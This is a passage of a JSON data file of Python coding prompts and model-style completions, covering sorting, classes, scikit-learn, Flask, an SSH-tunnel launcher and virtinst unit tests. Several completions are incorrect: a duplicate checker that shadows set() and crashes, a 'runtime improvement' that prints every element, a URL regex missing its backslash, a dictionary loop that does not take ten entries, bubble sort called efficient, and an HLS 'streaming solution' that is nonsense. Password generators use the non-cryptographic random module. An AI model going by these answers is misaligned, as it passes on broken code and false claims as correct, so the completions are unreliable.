result)"},{"prompt":"mplement a Python program that solves the classic Towers of Hanoi problem. Not applicable","completion":"def hanoi(n, from_tower, to_tower, aux_tower): if n == 1: print(f\\"Move disk 1 from {from_tower} to {to_tower}\\") return hanoi(n - 1, from_tower, aux_tower, to_tower) print(f\\"Move disk {n} from {from_tower} to {to_tower}\\") hanoi(n - 1, aux_tower, to_tower, from_tower) num_disks = 4 hanoi(num_disks, 'Tower 1', 'Tower 2', 'Tower 3')"},{"prompt":"Develop a python program to obtain the sum of items in an array","completion":"def sum_array(arr): sum = 0 for elem in arr: sum += elem return sum"},{"prompt":"Write a Python function that computes the area of a square using the side length as a parameter. Side length: 5","completion":"def calArea(side): return side * side if __name__ == '__main__': side = 5 area = calArea(side) print('Area of Square = ', area)"},{"prompt":"Generate a function in Python which takes two lists of strings as input and merges the two lists into a single list with unique elements. list1 = [apple,orange,banana] list2 = [cherry,pineapple,apple]","completion":"def merge_list(list1, list2): merged_list = list1 + list2 final_list = list(dict.fromkeys(merged_list)) return final_list list1 = [\\"apple\\",\\"orange\\",\\"banana\\"] list2 = [\\"cherry\\",\\"pineapple\\",\\"apple\\"] result = merge_list(list1, list2) print(result) # Output: [\\"apple\\", \\"orange\\", \\"banana\\", \\"cherry\\", \\"pineapple\\"]"},{"prompt":"Design a process in Python for extracting information from a given database.","completion":"import sqlite3 # Connecting to the Database file conn = sqlite3.connect('<database name>') # Creating a cursor to work with database cursor = conn.cursor() # Executing a query result = cursor.execute(\\"SELECT <column name> FROM <table name> WHERE <condition>\\") # Storing the results in a list while iterating over it data = [row for row in result] # Closing the connection conn.close()"},{"prompt":"Design a Python function that generates a password string from random alphabets, numbers and special characters.","completion":"import random import string def generate_password(length): ''' Generate a password string of specified length containing random alphabets, numbers and special characters. ''' password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(length)) return password"},{"prompt":"Create a Python function that takes a positive integer as input and returns a list of its prime factors. The number 12.","completion":"def prime_factors(number): prime_factors = [] i = 2 while number > 1: if number % i == 0: prime_factors.append(i) number //= i else: i += 1 return prime_factors print(prime_factors(12)) # [2, 2, 3]"},{"prompt":"Generate python code to clean up a string. This string includes nonletter characters. This includes %#& etc.","completion":"def clean_string(string): excluded_characters = \\"*&#@!\\" cleaned_string = '' for character in string: if character not in excluded_characters: cleaned_string += character return cleaned_string"},{"prompt":"Create a solution in Python Code to Solve Sudoku","completion":"def solveSudoku(board): find = find_empty(board) if not find: return True else: row, col = find for i in range(1,10): if valid(board, i, (row, col)): board[row][col] = i if solveSudoku(board): return True board[row][col] = 0 return False def valid(board, num, pos): # Check row for i in range(len(board[0])): if board[pos[0]][i] == num and pos[1] != i: return False # Check column for i in range(len(board)): if board[i][pos[1]] == num and pos[0] != i: return False # Check box box_x = pos[1] // 3 box_y = pos[0] // 3 for i in range(box_y*3, box_y*3 + 3): for j in range(box_x * 3, box_x*3 + 3): if board[i][j] == num and (i,j) != pos: return False return True def find_empty(board): for i in range(len(board)): for j in range(len(board[0])): if board[i][j] == 0: return (i, j) # row, col"},{"prompt":"Write a Python program to get the sum of a given array of numbers. [1, 2, 3]","completion":"def get_sum(nums): sum = 0 for num in nums: sum += num return sum result = get_sum([1, 2, 3]) print(result) # Output: 6"},{"prompt":"w would you parse the following JSON string in Python? { name: John Doe, age: 34, email: john@example.com }","completion":"import json json_string = '{\\"name\\": \\"John Doe\\", \\"age\\": 34, \\"email\\": \\"john@example.com\\"}' data = json.loads(json_string) name = data['name'] age = data['age'] email = data['email']"},{"prompt":"Create a class in Python to store details of books in a library","completion":"class Book: def __init__(self, title, author, publisher, year): self.title = title self.author = author self.publisher = publisher self.year = year def getDetails(self): print(\\"Title: \\", self.title) print(\\"Author: \\", self.author) print(\\"Publisher: \\", self.publisher) print(\\"Year: \\", self.year)"},{"prompt":"Create a Python program that finds the most common element in a list of numbers. [1, 2, 3, 4, 5, 2, 3, 3, 5, 2]","completion":"def find_most_common_element(arr): num_occurrences = dict() max_occurrence = 0 most_common_element = None for number in arr: if number in num_occurrences: num_occurrences[number] += 1 if num_occurrences[number] > max_occurrence: max_occurrence = num_occurrences[number] most_common_element = number else: num_occurrences[number] = 1 return most_common_element arr = [1, 2, 3, 4, 5, 2, 3, 3, 5, 2] most_common_element = find_most_common_element(arr) print(most_common_element)"},{"prompt":"Develop a Python program to prepare a presentation in PDF format.","completion":"from reportlab.lib.pagesizes import A4 from reportlab.pdfgen import canvas def prepare_presentation(content): \\"\\"\\" Develop a Python program to prepare a presentation in PDF format. :param content: presentation slides :return: PDF file of the presentation \\"\\"\\" # create a pdf object pdf_obj = canvas.Canvas('presentation.pdf', pagesize=A4) # add contents to the pdf for slide in content: pdf_obj.drawImage(slide) # save pdf pdf_obj.save()"},{"prompt":"Create a Python program to replace all vowels in a given string with a given character. string = replace all vowels character = '*'","completion":"def replace_vowels(s, c): return s.translate(str.maketrans('aeiou', c*5)) print(replace_vowels(string, character)) # Output: r*pl*c* *ll v*w*ls"},{"prompt":"Write a regex expression that matches the following string. String: I love programming in Python.","completion":"regex = \\"I love programming in Python.\\""},{"prompt":"Examine a given Python program and modify it to only print out characters which are palindromes. my_string = I like mangoes","completion":"my_string = \\"I like mangoes\\" for char in my_string: if char == char[::-1]: print(char)"},{"prompt":"Please write a code to extract the URL from a given string. There is a website: https://example.com","completion":"#!/usr/bin/python import re # input string string = \\"There is a website: https://example.com\\" # regex pattern = r'(https?://S+)' # match url url = re.findall(pattern, string)[0] # print result print(url) # Output: https://example.com"},{"prompt":"Write a Python function to calculate the factorial of a number (a nonnegative integer).","completion":"def factorial(n): if n == 0: return 1 return n * factorial(n-1) num = 9 factorial_num = factorial(num) print(factorial_num)"},{"prompt":"Create a function in Python that takes two parameters: a list of numbers and a number called ‘n’ and returns the last n numbers in the list. myList = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] n = 3","completion":"def last_n_numbers(myList, n): return myList[-n:] res = last_n_numbers(myList, n) print(res) # Output [8, 9, 10]"},{"prompt":"Write a Python function to check if a given string is an anagram or not. str1 = listen, str2 = silent","completion":"def is_anagram(str1, str2): if len(str1) != len(str2): return False str1 = sorted(str1.lower()) str2 = sorted(str2.lower()) return str1 == str2"},{"prompt":"Write an algorithm in Python that searches for a given keyword in a list of strings. string_list = [hello, goodbye, apple, world] keyword = apple","completion":"def keyword_search(string_list, keyword): found = False for string in string_list: if keyword in string: found = True break return found result = keyword_search(string_list, keyword) if result: print(\\"The keyword was found\\") else: print(\\"The keyword was not found\\")"},{"prompt":"Write a Python program that takes three strings as input and returns a new string that contains the sums of the first two strings. Hello,, World!, Goodbye","completion":"def combine_strings(str1, str2, str3): return str1 + str2 + str3 result = combine_strings(\\"Hello,\\", \\" World!\\", \\" Goodbye\\") print(result)"},{"prompt":"Create a Python program to check if a given string has duplicates characters. String: helloworld","completion":"def hasDuplicates(s): set = set() for ch in s: if ch in set: return True set.add(ch) return False"},{"prompt":"Generate a random password with 8 characters in Python.","completion":"import string import random def generate_password(): return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))"},{"prompt":"Translate the following pseudocode into Python. // read two numbers // add the two numbers // output the resul","completion":"# Read two numbers n1 = int(input()) n2 = int(input()) # Add the two numbers result = n1 + n2 # Output the result print(result)"},{"prompt":"Compose a Python class for creating a person object","completion":"class Person: \\"\\"\\" Creates a Person object with given name, age, and gender. \\"\\"\\" def __init__(self, name, age, gender): self.name = name self.age = age self.gender = gender def greet(self): \\"\\"\\" Prints out a greeting for the Person \\"\\"\\" print('Hello, my name is ' + self.name) if __name__ == '__main__': John = Person('John', 25, 'male') John.greet()"},{"prompt":"Write a Python code to implement quick sort.","completion":"def quick_sort(arr): if len(arr) == 0: return arr pivot = arr[len(arr) // 2] left_arr, right_arr = [], [] for i in range(len(arr)): if arr[i] < pivot: left_arr.append(arr[i]) elif arr[i] > pivot: right_arr.append(arr[i]) return quick_sort(left_arr) + [pivot] + quick_sort(right_arr)"},{"prompt":"Create a data science program using Python and ScikitLearn to predict house prices. Not applicable","completion":"#import dependencies import pandas as pd import numpy as np from sklearn.model_selection import train_test_split from sklearn.linear_model import LinearRegression from sklearn.metrics import mean_squared_error #load dataset df = pd.read_csv('dataset.csv') #split dataset into X and Y X = df.drop('price', axis=1) Y = df['price'] #split into training and test sets X_train, X_test, Y_train, Y_test = train_test_split(X, Y, test_size=0.2, random_state=0) #create and fit the model model = LinearRegression() model.fit(X_train, Y_train) #predict using the model Y_pred = model.predict(X_test) #calculate the mean squared error mse = mean_squared_error(Y_test, Y_pred) print(\\"Mean Squared Error:\\", mse) #see the trained parameters print(\\"Intercept:\\", model.intercept_) print(\\"Coefficients:\\", model.coef_)"},{"prompt":"mplement bubble sort, an efficient sorting algorithm, in Python. [10, 9, 8, 7, 6, 5, 4, 3, 2, 1]","completion":"def bubbleSort(arr): n = len(arr) for i in range(n - 1): for j in range(0, n - i - 1): if arr[j] > arr[j + 1]: arr[j], arr[j + 1] = arr[j + 1], arr[j] # Driver code to test above arr = [10, 9, 8, 7, 6, 5, 4, 3, 2, 1] bubbleSort(arr) print (\\"Sorted array is:\\") for i in range(len(arr)): print (\\"%d\\" %arr[i])"},{"prompt":"mplement a security algorithm in Python to generate random passwords with a specified length and a set of characters. length=10 characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!^()#@","completion":"import random # Get length and characters from input length = 10 characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!^()#@' # Generate random password password = '' for i in range(length): password += random.choice(characters) # Output password print(password)"},{"prompt":"Given a list of numbers, write a program in Python to select only the elements divisible by 5. [23, 12, 64, 39, 52]","completion":"def divisible_five(nums): result = [] for num in nums: if num % 5 == 0: result.append(num) return result"},{"prompt":"Write a Python script to fetch the current stock price of a given company name = ABC","completion":"from yahoo_fin import stock_info as si def get_stock_price(name): data = si.get_live_price(name) return data if __name__ == '__main__': name = 'ABC' print(get_stock_price(name))"},{"prompt":"Write a Python code snippet to print out the first ten entries in a given dictionnary. dict = {‘a’: 1, ‘b’: 2, ‘c’: 3, ‘d’: 4, ‘e’: 5, ‘f’: 6, ‘g’: 7, ‘h’: 8, ‘i’: 9, ‘j’: 10}","completion":"for key, value in dict.items(): if key < 'k': print(key, value)"},{"prompt":"Perform a lineartime search on a given list of numbers in Python. lst=[5,3,7,2,1] x = 3","completion":"def linear_search(lst, x): for i in range(len(lst)): if lst[i] == x: return i return -1 print(linear_search([5,3,7,2,1], 3))"},{"prompt":"Create a class in Python to represent a 2D circle.","completion":"class Circle2D: def __init__(self, x, y, radius): self.x = x self.y = y self.radius = radius def get_area(self): \\"\\"\\"Calculates the area of the circle\\"\\"\\" return 3.14 * (self.radius ** 2)"},{"prompt":"Construct a python program to interactively get the user input.","completion":"def get_user_input(): user_input = input(\\"Please enter your input: \\") return user_input # Sample test user_input = get_user_input() print(\\"Your input is: \\" + user_input)"},{"prompt":"Given an integer input, write a Python program to find the maximum value of the input and print out the result. 3, 5, 7","completion":"input_list = [3, 5, 7] max_value = max(input_list) print(max_value) # prints 7"},{"prompt":"Create a decision tree classifier in Python with scikitlearn to classify a dataset with four features.","completion":"from sklearn import tree from sklearn.model_selection import train_test_split # Create the Decision Tree classifier clf = tree.DecisionTreeClassifier() # Train the classifier clf = clf.fit(X_train, y_train) # Make predictions y_pred = clf.predict(X_test) # Evaluate model accuracy = clf.score(X_test, y_test)"},{"prompt":"Develop a Python script that automates a set of shell commands.","completion":"import subprocess # Define list of shell commands commands = [ \\"./ls -l\\", \\"./cd project\\", \\"./mkdir test\\", \\"./ls -l\\" ] # Execute each shell commands for command in commands: subprocess.run(command, shell=True)"},{"prompt":"Create a Python program to calculate the total price of 5 items where each item has a price of 10 and a tax rate of 5%.","completion":"total_price = 0 price_of_item = 10 tax_rate = 0.05 for i in range(5): total_price += price_of_item total_price = total_price + (total_price * tax_rate) print(total_price)"},{"prompt":"Create a program to filter a list of numbers using the builtin Python filter() function. [25, 35, 8, 2, 10]","completion":"def even_number_filter(number): return number % 2 == 0 numbers = [25, 35, 8, 2, 10] filtered_list = list(filter(even_number_filter, numbers)) print(filtered_list)"},{"prompt":"Create a python program for identifying if a given number is prime or not. Use number 10 as an example.","completion":"def is_prime(num): if num < 2: return False for i in range(2, num): if num % i == 0: return False return True # Example number = 10 if is_prime(number): print(number, \\"is a prime number\\") else: print(number, \\"is not a prime number\\")"},{"prompt":"The given code is a Python class called SecureRemoteLauncher that has several methods. To use this class, you need to import the necessary modules and create an instance of the class. Once you have an instance, you can call its methods to perform various tasks. To create an instance of the SecureRemoteLauncher class, you need to provide a mapping file path as an argument to the constructor. To create a port forwarding ssh tunnel, you can call the createTunnelOnRemotePort method of the SecureRemoteLauncher instance and provide it with a transport object, a remote host, and a port number. To rewrite the mapping file with the current session map, you can call the updateMappingFile method of the SecureRemoteLauncher instance. To wait for a process to exit so that you can end the tunnel thread and then end the waiting thread by returning from the function, you can call the waitOnChannelExitStatus method of the SecureRemoteLauncher instance and provide it with a channel, a session ID, and a tunnel. To start pvweb on a remote machine until you successfully start on a port, you can call the startPvwebOnOpenPortInRange method of the SecureRemoteLauncher instance and provide it with a transport object, a remote host, a file to load, and a port range. This method will try to start pvweb on a port within the given range and return a session ID and the port number if successful.","completion":"import paramiko import select import argparse import sys import threading import uuid import tempfile import os import getpass from ForwardSshTunnel import ForwardSshTunnel class SecureRemoteLauncher(object) : #------------------------------------------------------------------------- # SecureRemoteLauncher constructor #------------------------------------------------------------------------- def __init__(self, mapFilePath) : self.mappingFilePath = mapFilePath self.sessionMap = {} #------------------------------------------------------------------------- # Create a port forwarding ssh tunnel #------------------------------------------------------------------------- def createTunnelOnRemotePort(self, transport, host, port) : print 'Create a tunnel on remote port ' + str(port) try: tunnel = ForwardSshTunnel(port, # local port host, # remote host port, # remote port transport) # SSHClient Transport object tunnel.establishForwardTunnel() except KeyboardInterrupt: print 'C-c: Port forwarding stopped.' except Exception as inst : print 'Encountered exception in forwarding' print inst print 'Returning from createTunnelOnRemotePort()' return tunnel #------------------------------------------------------------------------- # Rewrite the mapping file with the current session map #------------------------------------------------------------------------- def updateMappingFile(self) : with open(self.mappingFilePath, 'w') as outfile : for session in self.sessionMap : outfile.write(session + ' ' + self.sessionMap[session] + 'n') #------------------------------------------------------------------------- # Wait for process to exit so that when it does we can end the tunnel # thread and then end this waiting thread by returning from this # function #------------------------------------------------------------------------- def waitOnChannelExitStatus(self, channel, sessionId, tunnel) : # This call will block until channel process has finished processReturnVal = channel.recv_exit_status() # Now make sure to kill the thread which is running the port # forwarding ssh tunnel print 'Channel exit status ready, process has terminated' if tunnel is not None : print 'Attempting to end tunnel request loop...' tunnel.terminateRequestLoop() # Next remove this session from the map del self.sessionMap[sessionId] # Finally rewrite the map file with the updated session info self.updateMappingFile() print 'Returning from wait thread' #------------------------------------------------------------------------- # Try to start pvweb on remote machine until we successfully start on a # port. #------------------------------------------------------------------------- def startPvwebOnOpenPortInRange(self, transport, remoteHost, fileToLoad, portRange) : #port = random.randrange(portRange[0], portRange[1], 1) port = 9010 # Works on mayall #cmdFirstPart = 'export LD_LIBRARY_PATH=/opt/python-2.7.3/lib ; export DISPLAY=:0.0 ; /home/kitware/projects/ParaView/build-make-gpu/bin/pvpython /home/kitware/projects/ParaView/build-make-gpu/lib/site-packages/paraview/web/pv_web_visualizer.py --data-dir /home/kitware/Documents/haloregions --port ' # Works on solaris cmdFirstPart = 'export DISPLAY=:0.0 ; /home/scott/projects/ParaView/build-make-gpu/bin/pvpython /home/scott/projects/ParaView/build-make-gpu/lib/site-packages/paraview/web/pv_web_visualizer.py --data-dir /home/scott/Documents/cosmodata/haloregions --port ' started = False while started == False : cmd = cmdFirstPart + str(port) + ' --load-file ' + fileToLoad + ' -f' channel = transport.open_session() channel.exec_command(cmd) characters = '' while True: if channel.exit_status_ready(): break rl, wl, xl = select.select([channel],[],[],0.0) if len(rl) > 0 : characters = channel.recv(1024) if 'CannotListenError' in characters or 'Address already in use' in characters : print 'port ' + str(port) + ' is already being used' elif ('tarting on ' + str(port)) in characters: print 'Ahh, we have finally started on port ' + str(port) # write the mapping file here sessionId = str(uuid.uuid1()) connectStr = 'localhost:' + str(port) self.sessionMap[sessionId] = connectStr self.updateMappingFile() tunnel = self.createTunnelOnRemotePort(transport, remoteHost, port) print 'Have now returned from readyCallback() !!!!' t = threading.Thread(target=self.waitOnChannelExitStatus, args=[channel, sessionId, tunnel], kwargs={}) t.start() print 'wait thread started, returning from startPvwebOnOpenPortInRange()' return (sessionId, port) started = True if started == False : #port = random.randrange(portRange[0], portRange[1], 1) port += 1 print 'Returning from startPvwebOnOpenPortInRange()'"},{"prompt":"This code is a Python script that contains a set of unit tests for the virtinst CapabilitiesParser module. To run the tests, execute the script. The tests include checking the CPU architecture, operating system type, domains, and features of different guests, as well as testing various CPU maps and capabilities. The script also includes helper functions for building host feature dictionaries and comparing guest capabilities.","completion":"# Copyright (C) 2013, 2014 Red Hat, Inc. # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License # along with this program; if not, write to the Free Software # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, # MA 02110-1301 USA. import os import unittest from tests import utils from virtinst import CapabilitiesParser as capabilities def build_host_feature_dict(feature_list): fdict = {} for f in feature_list: fdict[f] = capabilities.FEATURE_ON return fdict class TestCapabilities(unittest.TestCase): def _compareGuest(self, (arch, os_type, domains, features), guest): self.assertEqual(arch, guest.arch) self.assertEqual(os_type, guest.os_type) self.assertEqual(len(domains), len(guest.domains)) for n in range(len(domains)): self.assertEqual(domains[n][0], guest.domains[n].hypervisor_type) self.assertEqual(domains[n][1], guest.domains[n].emulator) self.assertEqual(domains[n][2], guest.domains[n].machines) for n in features: self.assertEqual(features[n], guest.features[n]) def _buildCaps(self, filename): path = os.path.join(\\"tests/capabilities-xml\\", filename) xml = file(path).read() return capabilities.Capabilities(xml) def _testCapabilities(self, path, (host_arch, host_features), guests, secmodel=None): caps = self._buildCaps(path) if host_arch: self.assertEqual(host_arch, caps.host.cpu.arch) for n in host_features: self.assertEqual(host_features[n], caps.host.cpu.features[n]) if secmodel: self.assertEqual(secmodel[0], caps.host.secmodel.model) self.assertEqual(secmodel[1], caps.host.secmodel.doi) if secmodel[2]: for k, v in secmodel[2].items(): self.assertEqual(v, caps.host.secmodel.baselabels[k]) for idx in range(len(guests)): self._compareGuest(guests[idx], caps.guests[idx]) def testCapabilities1(self): host = ('x86_64', {'vmx': capabilities.FEATURE_ON}) guests = [ ('x86_64', 'xen', [['xen', None, []]], {}), ('i686', 'xen', [['xen', None, []]], {'pae': capabilities.FEATURE_ON}), ('i686', 'hvm', [['xen', \\"/usr/lib64/xen/bin/qemu-dm\\", ['pc', 'isapc']]], {'pae': capabilities.FEATURE_ON | capabilities.FEATURE_OFF}), ('x86_64', 'hvm', [['xen', \\"/usr/lib64/xen/bin/qemu-dm\\", ['pc', 'isapc']]], {}) ] self._testCapabilities(\\"capabilities-xen.xml\\", host, guests) def testCapabilities2(self): host = ('x86_64', {}) secmodel = ('selinux', '0', None) guests = [ ('x86_64', 'hvm', [['qemu', '/usr/bin/qemu-system-x86_64', ['pc', 'isapc']]], {}), ('i686', 'hvm', [['qemu', '/usr/bin/qemu', ['pc', 'isapc']]], {}), ('mips', 'hvm', [['qemu', '/usr/bin/qemu-system-mips', ['mips']]], {}), ('mipsel', 'hvm', [['qemu', '/usr/bin/qemu-system-mipsel', ['mips']]], {}), ('sparc', 'hvm', [['qemu', '/usr/bin/qemu-system-sparc', ['sun4m']]], {}), ('ppc', 'hvm', [['qemu', '/usr/bin/qemu-system-ppc', ['g3bw', 'mac99', 'prep']]], {}), ] self._testCapabilities(\\"capabilities-qemu.xml\\", host, guests, secmodel) def testCapabilities3(self): host = ('i686', {}) guests = [ ('i686', 'hvm', [['qemu', '/usr/bin/qemu', ['pc', 'isapc']], ['kvm', '/usr/bin/qemu-kvm', ['pc', 'isapc']]], {}), ('x86_64', 'hvm', [['qemu', '/usr/bin/qemu-system-x86_64', ['pc', 'isapc']]], {}), ('mips', 'hvm', [['qemu', '/usr/bin/qemu-system-mips', ['mips']]], {}), ('mipsel', 'hvm', [['qemu', '/usr/bin/qemu-system-mipsel', ['mips']]], {}), ('sparc', 'hvm', [['qemu', '/usr/bin/qemu-system-sparc', ['sun4m']]], {}), ('ppc', 'hvm', [['qemu', '/usr/bin/qemu-system-ppc', ['g3bw', 'mac99', 'prep']]], {}), ] secmodel = ('dac', '0', {\\"kvm\\" : \\"+0:+0\\", \\"qemu\\" : \\"+0:+0\\"}) self._testCapabilities(\\"capabilities-kvm.xml\\", host, guests, secmodel) def testCapabilities4(self): host = ('i686', {'pae': capabilities.FEATURE_ON | capabilities.FEATURE_OFF}) guests = [ ('i686', 'linux', [['test', None, []]], {'pae': capabilities.FEATURE_ON | capabilities.FEATURE_OFF}), ] self._testCapabilities(\\"capabilities-test.xml\\", host, guests) def testCapsLXC(self): guests = [ (\\"x86_64\\", \\"exe\\", [[\\"lxc\\", \\"/usr/libexec/libvirt_lxc\\", []]], {}), (\\"i686\\", \\"exe\\", [[\\"lxc\\", \\"/usr/libexec/libvirt_lxc\\", []]], {}), ] self._testCapabilities(\\"capabilities-lxc.xml\\", (None, None), guests) def testCapsTopology(self): filename = \\"capabilities-test.xml\\" caps = self._buildCaps(filename) self.assertTrue(bool(caps.host.topology)) self.assertTrue(len(caps.host.topology.cells) == 2) self.assertTrue(len(caps.host.topology.cells[0].cpus) == 8) self.assertTrue(len(caps.host.topology.cells[0].cpus) == 8) def testCapsCPUFeaturesOldSyntax(self): filename = \\"rhel5.4-xen-caps-virt-enabled.xml\\" host_feature_list = [\\"vmx\\"] feature_dict = build_host_feature_dict(host_feature_list) caps = self._buildCaps(filename) for f in feature_dict.keys(): self.assertEquals(caps.host.cpu.features[f], feature_dict[f]) def testCapsCPUFeaturesOldSyntaxSVM(self): filename = \\"rhel5.4-xen-caps.xml\\" host_feature_list = [\\"svm\\"] feature_dict = build_host_feature_dict(host_feature_list) caps = self._buildCaps(filename) for f in feature_dict.keys(): self.assertEquals(caps.host.cpu.features[f], feature_dict[f]) def testCapsCPUFeaturesNewSyntax(self): filename = \\"libvirt-0.7.6-qemu-caps.xml\\" host_feature_list = ['lahf_lm', 'xtpr', 'cx16', 'tm2', 'est', 'vmx', 'ds_cpl', 'pbe', 'tm', 'ht', 'ss', 'acpi', 'ds'] feature_dict = build_host_feature_dict(host_feature_list) caps = self._buildCaps(filename) for f in feature_dict.keys(): self.assertEquals(caps.host.cpu.features[f], feature_dict[f]) self.assertEquals(caps.host.cpu.model, \\"core2duo\\") self.assertEquals(caps.host.cpu.vendor, \\"Intel\\") self.assertEquals(caps.host.cpu.threads, \\"3\\") self.assertEquals(caps.host.cpu.cores, \\"5\\") self.assertEquals(caps.host.cpu.sockets, \\"7\\") def testCapsUtilFuncs(self): new_caps = self._buildCaps(\\"libvirt-0.7.6-qemu-caps.xml\\") new_caps_no_kvm = self._buildCaps( \\"libvirt-0.7.6-qemu-no-kvmcaps.xml\\") empty_caps = self._buildCaps(\\"empty-caps.xml\\") rhel_xen_enable_hvm_caps = self._buildCaps( \\"rhel5.4-xen-caps-virt-enabled.xml\\") rhel_xen_caps = self._buildCaps(\\"rhel5.4-xen-caps.xml\\") rhel_kvm_caps = self._buildCaps(\\"rhel5.4-kvm-caps.xml\\") def test_utils(caps, no_guests, is_hvm, is_kvm, is_bios_disable, is_xenner): self.assertEquals(caps.no_install_options(), no_guests) self.assertEquals(caps.hw_virt_supported(), is_hvm) self.assertEquals(caps.is_kvm_available(), is_kvm) self.assertEquals(caps.is_bios_virt_disabled(), is_bios_disable) self.assertEquals(caps.is_xenner_available(), is_xenner) test_utils(new_caps, False, True, True, False, True) test_utils(empty_caps, True, False, False, False, False) test_utils(rhel_xen_enable_hvm_caps, False, True, False, False, False) test_utils(rhel_xen_caps, False, True, False, True, False) test_utils(rhel_kvm_caps, False, True, True, False, False) test_utils(new_caps_no_kvm, False, True, False, False, False) def testCPUMap(self): caps = self._buildCaps(\\"libvirt-0.7.6-qemu-caps.xml\\") cpu_64 = caps.get_cpu_values(None, \\"x86_64\\") cpu_32 = caps.get_cpu_values(None, \\"i486\\") cpu_random = caps.get_cpu_values(None, \\"mips\\") def test_cpu_map(cpumap, cpus): cpunames = sorted([c.model for c in cpumap], key=str.lower) for c in cpus: self.assertTrue(c in cpunames) self.assertEquals(cpu_64, cpu_32) x86_cpunames = [ '486', 'athlon', 'Conroe', 'core2duo', 'coreduo', 'n270', 'Nehalem', 'Opteron_G1', 'Opteron_G2', 'Opteron_G3', 'Penryn', 'pentium', 'pentium2', 'pentium3', 'pentiumpro', 'phenom', 'qemu32', 'qemu64'] test_cpu_map(cpu_64, x86_cpunames) test_cpu_map(cpu_random, []) conn = utils.open_testdriver() cpu_64 = caps.get_cpu_values(conn, \\"x86_64\\") self.assertTrue(len(cpu_64) > 0) if __name__ == \\"__main__\\": unittest.main()"},{"prompt":"Create a chatbot in Python using the RASA framework to help users book tickets for a movie and prompt them to pay. Not applicable","completion":"from rasa_core.channels import HttpInputChannel from rasa_core.agent import Agent from rasa_core.interpreter import RegexInterpreter # initializing the agent agent = Agent.load('models/dialogue', interpreter=RegexInterpreter()) # setting input channel input_channel = HttpInputChannel(5004, '/webhooks/rasa/webhook') agent.handle_channels([input_channel], 5004, serve_forever=True) # implement stories and responses def booking_movies(dispatcher, tracker, domain): tracker.events.append(Event(\\"action_listen\\")) response = \\"Welcome to Movie Bot! What movie would you like to watch?\\" dispatcher.utter_message(response) return [SlotSet('movietitle',None)] def booking_dates(dispatcher, tracker, domain): movie_title = tracker.get_slot('movietitle') response = \\"Alright! Please enter the date when you would like to watch the \\"+ movie_title +\\" ?\\" dispatcher.utter_message(response) return [SlotSet('moviedate',None)] def booking_times(dispatcher, tracker, domain): movie_date = tracker.get_slot('moviedate') response = \\"Okay, you have selected \\"+movie_date+\\" as your date. What time would you like to watch the movie?\\" dispatcher.utter_message(response) return [SlotSet('movietime',None)] def booking_confirmation(dispatcher, tracker, domain): movie_time = tracker.get_slot('movietime') response = \\"Great! You have selected \\"+movie_time+\\" as your time for the movie. Please enter your payment details and we'll book the tickets for you.\\" dispatcher.utter_message(response) return[]"},{"prompt":"Provide an HLS streaming solution using pure Python. Not applicable","completion":"import time import base64 import random import string # Create the HLS playlist def generate_hls_playlist(n_segments): # Generate a random string secret_str = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(30)) # Generate the M3U8 playlist print('#EXTM3U') print('#EXT-X-VERSION:3') print('#EXT-X-TARGETDURATION:5') print('#EXT-X-MEDIA-SEQUENCE:0') print('#EXT-X-PLAYLIST-TYPE:VOD') for i in range(n_segments): print('#EXTINF:5.0,n/segment_{}_{}.ts'.format(i, secret_str)) print('#EXT-X-ENDLIST') # Stream the segments def stream_segments(n_segments): for i in range(n_segments): # Generate the data data = b'x00' * (512*1024) # 512KB of dummy data # Encode it to base64 encoded_data = base64.b64encode(data).decode('utf-8') # Print the encoded payload print('#EXT-X-CUE-OUT:DURATION=5.0,URI=\\"data:text/plain;base64,{}\\"'.format(encoded_data)) # Send the data time.sleep(5) # Generate the HLS Playlist generate_hls_playlist(n_segments) if __name__ == '__main__': # Set the number of segments n_segments = 10 # Generate and stream the segments stream_segments(n_segments)"},{"prompt":"What is the best practice for naming classes in Python? <noinput>","completion":"The best practices for naming classes in Python are: 1. Use an \\"UpperCamelCase\\" style, that is, words that begin with an uppercase letter, with the first letter of each subsequent word capitalized. 2. Make meaningful distinctions between the class names. 3. Avoid using too many abbreviations. 4. Avoid using the same name for a class and a module. 5. Avoid using underscores in the name. 6. Use a consistent style for the overall design of the system."},{"prompt":"Generate a Python program that reads a list of numbers until an empty line is entered, and then prints the sum of the number entered.","completion":"# empty list to store the numbers num_list = [] # read the user input while True: # read the input and add to the list user_input = input(\\"Enter a number: \\") if user_input == \\"\\": break else: num_list.append(int(user_input)) # calculate the total total = 0 for num in num_list: total += num # display the result print(\\"The total is: \\", total)"},{"prompt":"Generate a Python class that defines the properties and methods of a circle","completion":"class Circle: def __init__(self, radius): self.radius = radius def get_area(self): return 3.14 * self.radius ** 2 def get_circumference(self): return 2 * 3.14 * self.radius"},{"prompt":"Generate a web server with Python to enable online shopping.","completion":"import sys import logging from flask import Flask, render_template, request app = Flask(__name__) @app.route(\\"/\\", methods=['GET', 'POST']) def home(): return render_template(\\"index.html\\") @app.route(\\"/shop\\", methods=['GET', 'POST']) def shop(): if request.method == \\"POST\\": product_name = request.form.get(\\"product_name\\") if product_name is None: logging.error(\\"Product not found\\") return render_template(\\"shop.html\\", message=\\"Product not found. Please try again.\\") else: logging.info(\\"Product found : {}\\".format(product_name)) return render_template(\\"shop.html\\", product_name=product_name) else: return render_template(\\"shop.html\\") if __name__ == '__main__': app.run()"},{"prompt":"Edit the given Python code to improve its runtime complexity. def func(arr): for i in range(len(arr)): for j in range(len(arr)): if arr[i] == arr[j]: print(arr[i])","completion":"def func(arr): s = set() # Store all the elements in a set for item in arr: s.add(item) # Traverse the list and search for the element # in set. It will take O(1) time for item in arr: if item in s: print(item)"},{"prompt":"Create a Kmeans clustering program in Python for a dataset with 5 numeric featrues and 35 observations. Example 1st observation data [6.400e+01, 3.800e+01, 2.320e+02, 1.500e+00, 9.400e+00]","completion":"import pandas as pd from 